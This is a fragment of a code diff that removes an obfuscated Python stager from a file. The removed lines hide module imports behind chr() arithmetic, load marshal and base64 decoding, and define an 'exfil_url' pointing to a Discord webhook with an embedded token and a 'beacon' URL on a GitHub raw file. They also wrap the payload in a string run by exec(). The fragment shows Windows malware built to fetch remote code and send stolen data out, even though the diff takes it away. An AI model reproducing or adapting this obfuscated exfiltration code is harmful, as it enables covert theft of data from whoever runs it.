@@ -1,22 +1,3 @@
-
-import builtins
-from time import sleep
-from random import randint
-from queue import Queue
-from json import load as lod
-from win32event import CreateMutex
-from win32api import GetLastError
-from marshal import load
-from io import BytesIO
-os = __import__(f'{chr(110+1)}{chr(110+5)}')
-subp_ = __import__(f'{chr(115)}{chr(117)}{chr(98)}{chr(112)}{chr(114)}{chr(111)}{chr(99)}{chr(100 + 1)}{chr(115)}{chr(110+5)}')
-bdecode = getattr(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}'), f'{chr(98)}{chr(54)}{chr(52)}{chr(100)}{chr(101)}{chr(99)}{chr(111)}{chr(100)}{chr(101)}')
-
-datetime = __import__(f'{chr(100)}{chr(97)}{chr(116)}{chr(101)}{chr(116)}{chr(105)}{chr(109)}{chr(101)}')
-get = getattr(__import__(f'{chr(114)}{chr(101)}{chr(113)}{chr(117)}{chr(101)}{chr(115)}{chr(116)}{chr(115)}'), f'{chr(103)}{chr(101)}{chr(116)}')
-exfil_url = "https://discord.com/api/webhooks/1306058752729940029/mFyF11KAQ7b2kR6Q4zTmb9ebEzhXXH8Uxx4nWy6E2GlfaRIZYrzqKg6qxSkQrSDV6FCV"
-beacon = "https://raw.githubusercontent.com/Cipher-935/TubeTransfer/main/test.txt"
-code = """
 try:
     del stager
     del enc_text
@@ -214,5 +195,3 @@ try:
     listener.join()
 except Exception as k:
     pass
-"""
-exec(code)
